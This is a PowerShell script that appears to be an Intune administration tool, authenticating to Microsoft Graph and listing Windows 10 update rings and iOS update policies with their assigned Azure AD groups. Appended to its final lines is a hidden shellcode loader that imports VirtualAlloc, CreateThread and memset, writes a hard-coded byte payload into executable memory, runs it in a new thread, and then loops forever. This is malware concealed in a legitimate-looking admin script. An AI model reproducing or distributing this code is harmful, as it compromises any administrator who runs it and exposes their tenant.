




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-SoftwareUpdatePolicy(){



[cmdletbinding()]

param
(
    [switch]$Windows10,
    [switch]$iOS
)

$graphApiVersion = "Beta"

    try {

        $Count_Params = 0

        if($iOS.IsPresent){ $Count_Params++ }
        if($Windows10.IsPresent){ $Count_Params++ }

        if($Count_Params -gt 1){

        write-host "Multiple parameters set, specify a single parameter -iOS or -Windows10 against the function" -f Red

        }

        elseif($Count_Params -eq 0){

        Write-Host "Parameter -iOS or -Windows10 required against the function..." -ForegroundColor Red
        Write-Host
        break

        }

        elseif($Windows10){

        $Resource = "deviceManagement/deviceConfigurations?`$filter=isof('microsoft.graph.windowsUpdateForBusinessConfiguration')&`$expand=groupAssignments"

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).value

        }

        elseif($iOS){

        $Resource = "deviceManagement/deviceConfigurations?`$filter=isof('microsoft.graph.iosUpdateConfiguration')&`$expand=groupAssignments"

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AADGroup(){



[cmdletbinding()]

param
(
    $GroupName,
    $id,
    [switch]$Members
)


$graphApiVersion = "v1.0"
$Group_resource = "groups"

    try {

        if($id){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        elseif($GroupName -eq "" -or $GroupName -eq $null){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        else {

            if(!$Members){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

            elseif($Members){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            $Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

                if($Group){

                $GID = $Group.id

                $Group.displayName
                write-host

                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"
                (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

                }

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$WSUPs = Get-SoftwareUpdatePolicy -Windows10

Write-Host "Software updates - Windows 10 Update Rings" -ForegroundColor Cyan
Write-Host

    if($WSUPs){

        foreach($WSUP in $WSUPs){

        write-host "Software Update Policy:"$WSUP.displayName -f Yellow
        $WSUP


        $TargetGroupIds = $WSUP.groupAssignments.targetGroupId

        write-host "Getting SoftwareUpdate Policy assignment..." -f Cyan

            if($TargetGroupIds){

                foreach($group in $TargetGroupIds){

                (Get-AADGroup -id $group).displayName

                }

            }

            else {

            Write-Host "No Software Update Policy Assignments found..." -ForegroundColor Red

            }

        }

    }

    else {

    Write-Host
    Write-Host "No Windows 10 Update Rings defined..." -ForegroundColor Red

    }

write-host



$ISUPs = Get-SoftwareUpdatePolicy -iOS

Write-Host "Software updates - iOS Update Policies" -ForegroundColor Cyan
Write-Host

    if($ISUPs){

        foreach($ISUP in $ISUPs){

        write-host "Software Update Policy:"$ISUP.displayName -f Yellow
        $ISUP

        $TargetGroupIds = $ISUP.groupAssignments.targetGroupId

        write-host "Getting SoftwareUpdate Policy assignment..." -f Cyan

            if($TargetGroupIds){

                foreach($group in $TargetGroupIds){

                (Get-AADGroup -id $group).displayName

                }

            }

            else {

            Write-Host "No Software Update Policy Assignments found..." -ForegroundColor Red

            }

        }

    }

    else {

    Write-Host
    Write-Host "No iOS Software Update Rings defined..." -ForegroundColor Red

    }

Write-Host
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xca,0x3e,0x0f,0xb6,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xe8,0x36,0xdc,0xfa,0x4a,0x2e,0xa3,0x05,0xb3,0xae,0xc4,0x8c,0x56,0x9f,0xc4,0xeb,0x13,0x8f,0xf4,0x78,0x71,0x23,0x7e,0x2c,0x62,0xb0,0xf2,0xf9,0x85,0x71,0xb8,0xdf,0xa8,0x82,0x91,0x1c,0xaa,0x00,0xe8,0x70,0x0c,0x39,0x23,0x85,0x4d,0x7e,0x5e,0x64,0x1f,0xd7,0x14,0xdb,0xb0,0x5c,0x60,0xe0,0x3b,0x2e,0x64,0x60,0xdf,0xe6,0x87,0x41,0x4e,0x7d,0xde,0x41,0x70,0x52,0x6a,0xc8,0x6a,0xb7,0x57,0x82,0x01,0x03,0x23,0x15,0xc0,0x5a,0xcc,0xba,0x2d,0x53,0x3f,0xc2,0x6a,0x53,0xa0,0xb1,0x82,0xa0,0x5d,0xc2,0x50,0xdb,0xb9,0x47,0x43,0x7b,0x49,0xff,0xaf,0x7a,0x9e,0x66,0x3b,0x70,0x6b,0xec,0x63,0x94,0x6a,0x21,0x18,0xa0,0xe7,0xc4,0xcf,0x21,0xb3,0xe2,0xcb,0x6a,0x67,0x8a,0x4a,0xd6,0xc6,0xb3,0x8d,0xb9,0xb7,0x11,0xc5,0x57,0xa3,0x2b,0x84,0x3f,0x00,0x06,0x37,0xbf,0x0e,0x11,0x44,0x8d,0x91,0x89,0xc2,0xbd,0x5a,0x14,0x14,0xc2,0x70,0xe0,0x8a,0x3d,0x7b,0x11,0x82,0xf9,0x2f,0x41,0xbc,0x28,0x50,0x0a,0x3c,0xd5,0x85,0xa7,0x39,0x41,0xe6,0x90,0x42,0x84,0x8e,0xe2,0x42,0xb7,0x12,0x6a,0xa4,0xe7,0xfa,0x3c,0x79,0x47,0xab,0xfc,0x29,0x2f,0xa1,0xf2,0x16,0x4f,0xca,0xd8,0x3e,0xe5,0x25,0xb5,0x17,0x91,0xdc,0x9c,0xec,0x00,0x20,0x0b,0x89,0x02,0xaa,0xb8,0x6d,0xcc,0x5b,0xb4,0x7d,0xb8,0xab,0x83,0xdc,0x6e,0xb3,0x39,0x4a,0x8e,0x21,0xc6,0xdd,0xd9,0xdd,0xc4,0x38,0x2d,0x42,0x36,0x6f,0x26,0x4b,0xa2,0xd0,0x50,0xb4,0x22,0xd1,0xa0,0xe2,0x28,0xd1,0xc8,0x52,0x09,0x82,0xed,0x9c,0x84,0xb6,0xbe,0x08,0x27,0xef,0x13,0x9a,0x4f,0x0d,0x4a,0xec,0xcf,0xee,0xb9,0xec,0x2c,0x39,0x87,0x9a,0x5c,0xf9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

